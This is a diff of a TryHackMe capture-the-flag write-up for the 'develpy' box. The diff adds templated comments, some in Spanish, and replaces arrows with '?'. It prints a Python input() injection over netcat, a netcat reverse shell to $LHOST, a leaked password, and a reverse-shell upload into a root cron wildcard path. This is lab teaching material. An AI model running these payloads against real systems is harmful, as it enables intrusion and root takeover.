@@ -1,49 +1,49 @@
-﻿# BSides Guatemala — develpy — TryHackMe Writeup
+# BSides Guatemala  develpy  TryHackMe Writeup
 
 **Target:** `TARGET_IP` (10.129.137.214 at time of solve)
 **OS:** Linux (Ubuntu 16.04)
 **Difficulty:** Medium
 **Tech stack:** OpenSSH 7.2p2, custom Python daemon fronted by `socat` on port 10000
-**Exploit chain:** Python `input()` injection on a `socat`-hosted Py2 script → reverse shell as `king` → Piet (`npiet`) PNG steganography → `c00ffe123!` → SSH as `king` → SSH local-port-forward to internal web → upload `.py` into a wildcard-glob cron path → root reverse shell
+**Exploit chain:** Python `input()` injection on a `socat`-hosted Py2 script ? reverse shell as `king` ? Piet (`npiet`) PNG steganography ? `c00ffe123!` ? SSH as `king` ? SSH local-port-forward to internal web ? upload `.py` into a wildcard-glob cron path ? root reverse shell
 
 ---
 
 ## Attack Chain Overview
 
 ```
-nmap → 22, 10000 (snet-sensor-mgmt?)
-    ↓
-curl :10000 → Python traceback (Py2 input() on attacker bytes)
-    ↓
-echo "__import__('os').system('id')" | nc → uid=king
-    ↓
-nc reverse shell as king → user.txt
-    ↓
-ls home → credentials.png  +  exploit.py / run.sh / root.sh / root /company
-    ↓
+nmap ? 22, 10000 (snet-sensor-mgmt?)
+    ?
+curl :10000 ? Python traceback (Py2 input() on attacker bytes)
+    ?
+echo "__import__('os').system('id')" | nc ? uid=king
+    ?
+nc reverse shell as king ? user.txt
+    ?
+ls home ? credentials.png  +  exploit.py / run.sh / root.sh / root /company
+    ?
 exfil credentials.png; strings/exiftool empty; image is npiet/Piet
-    ↓
-npiet credentials.png → c00ffe123!  (king's password)
-    ↓
+    ?
+npiet credentials.png ? c00ffe123!  (king's password)
+    ?
 ssh king@$TARGET   (stable foothold)
-    ↓
-crontab: */1 root cd /root/company && bash run.sh → python /root/company/media/*.py
-    ↓
-netstat -tulpn → internal web on :8080 (file uploader)
-    ↓
-ssh -L 8080:localhost:8080 king@$TARGET  → upload reverse-shell .py
-    ↓
-cron tick → /bin/sh -i as root → root.txt
+    ?
+crontab: */1 root cd /root/company && bash run.sh ? python /root/company/media/*.py
+    ?
+netstat -tulpn ? internal web on :8080 (file uploader)
+    ?
+ssh -L 8080:localhost:8080 king@$TARGET  ? upload reverse-shell .py
+    ?
+cron tick ? /bin/sh -i as root ? root.txt
 ```
 
 ---
 
 ## Table of Contents
 1. [Reconnaissance](#1-reconnaissance)
-2. [Initial Access — Python `input()` Injection](#2-initial-access--python-input-injection)
+2. [Initial Access  Python `input()` Injection](#2-initial-access--python-input-injection)
 3. [Post-Exploitation (`king`)](#3-post-exploitation-king)
-4. [User Flag — Piet/npiet Steganography](#4-user-flag--pietnpiet-steganography)
-5. [Privilege Escalation — Wildcard-Glob Cron + SSH Tunnel](#5-privilege-escalation--wildcard-glob-cron--ssh-tunnel)
+4. [User Flag  Piet/npiet Steganography](#4-user-flag--pietnpiet-steganography)
+5. [Privilege Escalation  Wildcard-Glob Cron + SSH Tunnel](#5-privilege-escalation--wildcard-glob-cron--ssh-tunnel)
 6. [Root Flag](#6-root-flag)
 7. [Key Takeaways](#7-key-takeaways)
 
@@ -52,6 +52,8 @@ cron tick → /bin/sh -i as root → root.txt
 ## 1. Reconnaissance
 
 ```bash
+# What it does: runs an Nmap scan with the specified ports/scripts/options.
+# Why here: identify exposed services and decide on the next enumeration.
 nmap -sS -Pn -n -p- --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,10000 $TARGET -oA service
 ```
@@ -59,18 +61,20 @@ nmap -sVC -p22,10000 $TARGET -oA service
 | Port | Service |
 |------|---------|
 | 22/tcp | OpenSSH 7.2p2 |
-| 10000/tcp | `snet-sensor-mgmt?` — nmap couldn't classify |
+| 10000/tcp | `snet-sensor-mgmt?`  nmap couldn't classify |
 
 The unidentified service is the entry point. See [nmap.md](../../tools/recon/nmap.md).
 
 ---
 
-## 2. Initial Access — Python `input()` Injection
+## 2. Initial Access  Python `input()` Injection
 
 Full technique: [python-input-injection.md](../../exploits/web-rce/python-input-injection.md).
 
 Open `:10000` in a browser / `curl`:
 ```bash
+# What it does: sends an HTTP request with the chosen method, headers or body.
+# Why here: test or trigger the web behavior described in this step.
 curl http://$TARGET:10000/
 # Private 0days
 #  Please enther number of exploits to send??: Traceback (most recent call last):
@@ -81,18 +85,26 @@ curl http://$TARGET:10000/
 
 Py `input()` evaluates its argument. Confirm + RCE:
 ```bash
+# What it does: envia un payload de codigo al servicio usando netcat.
+# Why here: explotar el servicio haciendo que evalue entrada controlada.
 echo "__import__('os').system('id')" | nc $TARGET 10000
 # uid=1000(king) gid=1000(king) groups=1000(king),...
 ```
 
 Reverse shell:
 ```bash
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 nc -lvnp 4444
+# What it does: envia un payload de codigo al servicio usando netcat.
+# Why here: explotar el servicio haciendo que evalue entrada controlada.
 echo "__import__('os').system('nc -e /bin/bash $LHOST 4444')" | nc $TARGET 10000
 ```
 
 Stabilise:
 ```bash
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 # Ctrl+Z
@@ -100,7 +112,7 @@ stty raw -echo; fg
 reset
 ```
 
-Tools: [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md) (which is what's hosting the script — see `cat run.sh` in §5).
+Tools: [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md) (which is what's hosting the script  see `cat run.sh` in §5).
 
 ---
 
@@ -109,12 +121,16 @@ Tools: [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md
 Standard [Linux enumeration](../../exploits/enumeration/linux-enumeration.md).
 
 ```bash
+# What it does: lists directory contents.
+# Why here: verificar archivos, permisos o loot en la ruta actual.
 ls -lha
 # -rwxrwxrwx 1 king king 266K Aug 27  2019 credentials.png
 # -rwxrwxrwx 1 king king  408 Aug 25  2019 exploit.py
 # -rw-r--r-- 1 root root   32 Aug 25  2019 root.sh
 # -rw-rw-r-- 1 king king  139 Aug 25  2019 run.sh
 # -rw-rw-r-- 1 king king   33 Aug 27  2019 user.txt
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat user.txt
 ```
 
@@ -122,23 +138,35 @@ cat user.txt
 
 ---
 
-## 4. User Flag — Piet/npiet Steganography
+## 4. User Flag  Piet/npiet Steganography
 
 Full technique: [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md).
 
 Exfil and triage:
 ```bash
 # Target
+# What it does: executes or compiles the script/program with the specified arguments.
+# Why here: launch the necessary exploit or helper in this phase.
 python3 -m http.server 8888
 # Attacker
+# What it does: downloads the specified URL to disk.
+# Why here: bring evidence, payloads or files needed to advance.
 wget http://$TARGET:8888/credentials.png
+# What it does: extracts readable strings from a binary or file.
+# Why here: buscar credenciales, rutas o tokens embebidos.
 strings credentials.png    # empty
+# What it does: inspects or extracts hidden content/metadata from a file.
+# Why here: recover clues or credentials hidden in assets.
 exiftool credentials.png   # nothing useful
-file credentials.png       # PNG, blocky grid of saturated colours → Piet
+# What it does: identifies file type and metadata.
+# Why here: choose the correct parser or technique.
+file credentials.png       # PNG, blocky grid of saturated colours ? Piet
 ```
 
 Run:
 ```bash
+# What it does: instala la herramienta o paquete local necesario.
+# Why here: tener disponible el helper antes de ejecutar la tecnica.
 sudo apt install npiet
 ./npiet credentials.png
 # c00ffe123!
@@ -146,6 +174,8 @@ sudo apt install npiet
 
 Use it:
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh king@$TARGET
 # password: c00ffe123!
 ```
@@ -154,12 +184,16 @@ Tools: [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/
 
 ---
 
-## 5. Privilege Escalation — Wildcard-Glob Cron + SSH Tunnel
+## 5. Privilege Escalation  Wildcard-Glob Cron + SSH Tunnel
 
 Full technique: [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md).
 
 ```bash
+# What it does: lists sudo privileges of the current or specified user.
+# Why here: encontrar comandos permitidos para escalar privilegios.
 sudo -l                                  # nothing
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /etc/crontab
 # *  *    * * *   king    cd /home/king/ && bash run.sh
 # *  *    * * *   root    cd /home/king/ && bash root.sh
@@ -169,11 +203,13 @@ cat /home/king/run.sh
 # socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
 
 cat root.sh
-# python /root/company/media/*.py        ← wildcard glob, attacker-controlled dir
+# python /root/company/media/*.py        ? wildcard glob, attacker-controlled dir
 ```
 
 Confirm cron tick rate:
 ```bash
+# What it does: filters text with the specified pattern.
+# Why here: extract the important clue from a large output.
 tail -f /var/log/syslog | grep -i cron
 ```
 
@@ -185,8 +221,10 @@ netstat -tulpn
 
 Tunnel it:
 ```bash
+# What it does: opens an SSH session or tunnel with the specified options.
+# Why here: obtain interactive shell or pivot to an internal service.
 ssh -L 8080:localhost:8080 king@$TARGET
-# Browser → http://localhost:8080  (web uploader)
+# Browser ? http://localhost:8080  (web uploader)
 ```
 
 Drop a Python reverse shell `.py` through the uploader (it lands under `/root/company/media/`):
@@ -200,9 +238,11 @@ subprocess.call(["/bin/sh", "-i"])
 
 Listener + wait:
 ```bash
+# What it does: opens or uses a TCP connection/listener.
+# Why here: receive shell, transfer data or check connectivity.
 nc -lvnp 1337
-# … one minute later …
-# whoami → root
+#  one minute later 
+# whoami ? root
 ```
 
 See [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) for the SSH forward, and [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md) for the wildcard variant.
@@ -212,6 +252,8 @@ See [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) for the SSH forwar
 ## 6. Root Flag
 
 ```bash
+# What it does: displays a file in the terminal.
+# Why here: read configuration, credentials, proof or flags.
 cat /root/root.txt
 ```
 
@@ -220,7 +262,7 @@ cat /root/root.txt
 ## 7. Key Takeaways
 
 - An unidentified service replying with a Python traceback is almost always Py2 `input()` or a direct interpretation primitive. `echo "1+1" | nc` is a free probe; if it computes, you have RCE.
-- `socat ... EXEC:./script,pty,stderr` is a debug pattern — when you find it, the script behind it is your foothold. Always read `run.sh` after landing.
+- `socat ... EXEC:./script,pty,stderr` is a debug pattern  when you find it, the script behind it is your foothold. Always read `run.sh` after landing.
 - Image files in user homes that don't yield to `strings` / `exiftool` / `steghide` and **look like Mondrian** are Piet. Run them through `npiet`.
 - Wildcard globs in cron lines (`python /opt/.../*.py`, `tar cf - *`, `chown -R user *`) are attacker-controlled if you can write to the glob dir. The cron line itself doesn't need to be writable.
 - Internal-only HTTP services (`netstat -tulpn` shows `127.0.0.1:8080`) are reachable via SSH local port forward once you have any user account.
@@ -228,10 +270,12 @@ cat /root/root.txt
 ---
 
 ## Related Notes
-- [python-input-injection.md](../../exploits/web-rce/python-input-injection.md) — initial access
-- [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md) — user-flag steganography
-- [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md) — wildcard-glob privesc variant
-- [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md) — internal web pivot
-- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md) — playbook backbone
-- [nmap](../../tools/recon/nmap.md), [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md), [wget](../../tools/web/wget.md) — recon & delivery
-- [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/strings.md) — image triage
+- [python-input-injection.md](../../exploits/web-rce/python-input-injection.md)  initial access
+- [npiet-piet-stego.md](../../exploits/stego/npiet-piet-stego.md)  user-flag steganography
+- [cron-script-abuse.md](../../exploits/privesc-linux/cron-script-abuse.md)  wildcard-glob privesc variant
+- [ssh-tunneling.md](../../exploits/pivot/ssh-tunneling.md)  internal web pivot
+- [linux-enumeration.md](../../exploits/enumeration/linux-enumeration.md)  playbook backbone
+- [nmap](../../tools/recon/nmap.md), [netcat](../../tools/pivot/netcat.md), [socat](../../tools/pivot/socat.md), [wget](../../tools/web/wget.md)  recon & delivery
+- [exiftool](../../tools/web/exiftool.md), [strings](../../tools/reversing/strings.md)  image triage
+
+
